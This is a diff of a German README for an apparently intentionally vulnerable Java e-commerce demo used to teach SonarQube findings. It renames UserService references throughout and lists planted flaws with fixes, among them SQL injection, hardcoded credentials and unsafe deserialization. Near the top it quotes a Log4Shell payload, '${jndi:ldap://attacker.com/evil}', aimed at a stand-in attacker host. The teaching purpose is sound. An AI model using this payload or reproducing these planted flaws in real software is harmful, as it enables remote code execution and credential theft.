@@ -12,7 +12,7 @@ Dieses E-Commerce-Beispiel demonstriert reale Code-Probleme, die SonarQube erken
 - Beispiel: `${jndi:ldap://attacker.com/evil}` in Logs
 
 **Im Code verwendet:**
-- `UserService.java` Zeile 38: User-Input wird direkt geloggt
+- `ecommerce.service.UserService.java` Zeile 38: User-Input wird direkt geloggt
 - `FileUploadController.java` Zeile 40, 46: Dateinamen werden geloggt
 
 **Exploit-Szenario:**
@@ -34,7 +34,7 @@ logger.info("User email: " + email);
 - Angreifer kann durch manipulierte JSON-Daten Code ausführen
 
 **Im Code verwendet:**
-- `UserService.java` Zeile 131-140: `deserializeUser()` Methode
+- `ecommerce.service.UserService.java` Zeile 131-140: `deserializeUser()` Methode
 - `enableDefaultTyping()` macht es besonders gefährlich!
 
 **Exploit-Szenario:**
@@ -81,7 +81,7 @@ logger.info("User email: " + email);
 - Version 3.x nicht mehr gewartet
 
 **Im Code verwendet:**
-- `UserService.java` Zeile 23: `HashedMap` als Cache
+- `ecommerce.service.UserService.java` Zeile 23: `HashedMap` als Cache
 
 **Fix:**
 ```xml
@@ -106,15 +106,15 @@ logger.info("User email: " + email);
 
 ### 🔴 CRITICAL - Security Vulnerabilities
 
-1. **SQL Injection** (UserService.java, Zeile 26-27)
+1. **SQL Injection** (ecommerce.service.UserService.java, Zeile 26-27)
    - String-Konkatenation in SQL-Query
    - Fix: PreparedStatement verwenden
 
-2. **Hardcoded Credentials** (UserService.java, Zeile 18)
+2. **Hardcoded Credentials** (ecommerce.service.UserService.java, Zeile 18)
    - Passwort im Code gespeichert
    - Fix: Configuration/Environment Variables nutzen
 
-3. **Plaintext Password Storage** (UserService.java, Zeile 30)
+3. **Plaintext Password Storage** (ecommerce.service.UserService.java, Zeile 30)
    - Passwörter unverschlüsselt in DB
    - Fix: Bcrypt/Argon2 für Hashing
 
@@ -124,23 +124,23 @@ logger.info("User email: " + email);
 
 ### 🟠 MAJOR - Bugs & Code Smells
 
-5. **Resource Leak** (UserService.java, Zeile 24-33)
+5. **Resource Leak** (ecommerce.service.UserService.java, Zeile 24-33)
    - ResultSet und Statement nicht geschlossen
    - Fix: try-with-resources verwenden
 
-6. **Null Pointer Exception** (UserService.java, Zeile 71-74)
+6. **Null Pointer Exception** (ecommerce.service.UserService.java, Zeile 71-74)
    - Keine Null-Prüfung vor Zugriff
    - Fix: Optional<> oder null-check
 
-7. **Empty Catch Block** (UserService.java, Zeile 105-112)
+7. **Empty Catch Block** (ecommerce.service.UserService.java, Zeile 105-112)
    - Exception wird verschluckt
    - Fix: Logging oder Re-throw
 
-8. **Missing equals()** (UserService.java, Zeile 115-118)
+8. **Missing equals()** (ecommerce.service.UserService.java, Zeile 115-118)
    - hashCode() ohne equals() überschrieben
    - Fix: Beide implementieren
 
-9. **Array Index Out of Bounds** (UserService.java, Zeile 150-153)
+9. **Array Index Out of Bounds** (ecommerce.service.UserService.java, Zeile 150-153)
    - Kein Check auf Array-Länge
    - Fix: Length-Prüfung oder Optional
 
@@ -150,51 +150,51 @@ logger.info("User email: " + email);
 
 ### 🟡 MEDIUM - Maintainability Issues
 
-11. **Cognitive Complexity** (UserService.java, Zeile 36-60)
+11. **Cognitive Complexity** (ecommerce.service.UserService.java, Zeile 36-60)
     - Zu viele verschachtelte if-Statements
     - SonarQube Limit: ~15, hier deutlich höher
     - Fix: Early returns, Guard Clauses
 
-12. **Code Duplication** (UserService.java, Zeile 36-60 und 63-77)
+12. **Code Duplication** (ecommerce.service.UserService.java, Zeile 36-60 und 63-77)
     - Ähnliche Validierungslogik dupliziert
     - Fix: Gemeinsame Methode extrahieren
 
-13. **Inefficient String Concatenation** (UserService.java, Zeile 121-128)
+13. **Inefficient String Concatenation** (ecommerce.service.UserService.java, Zeile 121-128)
     - String += in Schleife
     - Fix: StringBuilder verwenden
 
-14. **Magic Numbers** (UserService.java, Zeile 84-90)
+14. **Magic Numbers** (ecommerce.service.UserService.java, Zeile 84-90)
     - Zahlen ohne Bedeutung (10, 500.00, 65, 25)
     - Fix: Konstanten definieren
 
-15. **Dead Code** (UserService.java, Zeile 79-81)
+15. **Dead Code** (ecommerce.service.UserService.java, Zeile 79-81)
     - Methode wird nie aufgerufen
     - Fix: Entfernen oder nutzen
 
-16. **Commented-out Code** (UserService.java, Zeile 159-162)
+16. **Commented-out Code** (ecommerce.service.UserService.java, Zeile 159-162)
     - Alter Code auskommentiert
     - Fix: Löschen (Version Control nutzen)
 
-17. **Too Many Parameters** (UserService.java, Zeile 141-144)
+17. **Too Many Parameters** (ecommerce.service.UserService.java, Zeile 141-144)
     - 14 Parameter - schwer zu nutzen
     - Fix: Parameter Object Pattern
 
-18. **Flag Argument** (UserService.java, Zeile 156-162)
+18. **Flag Argument** (ecommerce.service.UserService.java, Zeile 156-162)
     - Boolean-Parameter ändert Verhalten komplett
     - Fix: Zwei separate Methoden
 
 ### 🔵 INFO - Design Problems
 
-19. **Circular Dependency** (UserService.java ↔ OrderRepository.java)
-    - UserService braucht OrderRepository
-    - OrderRepository braucht UserService
+19. **Circular Dependency** (ecommerce.service.UserService.java ↔ OrderRepository.java)
+    - ecommerce.service.UserService braucht OrderRepository
+    - OrderRepository braucht ecommerce.service.UserService
     - Fix: Architektur refactoring, Events verwenden
 
 20. **Broken Encapsulation** (User.java, Zeile 12-13)
     - Public fields statt private mit getters
     - Fix: Fields private machen
 
-21. **Mutable Static Field** (UserService.java, Zeile 131)
+21. **Mutable Static Field** (ecommerce.service.UserService.java, Zeile 131)
     - Static List ist veränderbar
     - Fix: Immutable Collection oder Synchronization
 
@@ -210,7 +210,7 @@ logger.info("User email: " + email);
     - Date ist mutable
     - Fix: Kopie zurückgeben oder LocalDateTime
 
-25. **Parameter Reassignment** (UserService.java, Zeile 136-143)
+25. **Parameter Reassignment** (ecommerce.service.UserService.java, Zeile 136-143)
     - Parameter wird überschrieben
     - Fix: Lokale Variable verwenden
 
@@ -226,12 +226,12 @@ logger.info("User email: " + email);
 
 ### Warum schwer zu lösen?
 
-Die Circular Dependency zwischen `UserService` und `OrderRepository` ist besonders interessant:
+Die Circular Dependency zwischen `ecommerce.service.UserService` und `OrderRepository` ist besonders interessant:
 
 ```
-UserService 
+ecommerce.service.UserService 
     └── benötigt OrderRepository (Constructor Injection)
-         └── benötigt UserService (Setter Injection)
+         └── benötigt ecommerce.service.UserService (Setter Injection)
               └── benötigt OrderRepository...
 ```
 
@@ -239,12 +239,12 @@ UserService
 
 **Phase 1**: Ursprünglich einfach
 ```java
-UserService → OrderRepository
+ecommerce.service.UserService → OrderRepository
 ```
 
 **Phase 2**: Feature-Addition
 - "Wir brauchen User-Info in OrderRepository"
-- Schnelle Lösung: Setter für UserService
+- Schnelle Lösung: Setter für ecommerce.service.UserService
 
 **Phase 3**: Weiteres Wachstum
 - OrderService wird hinzugefügt
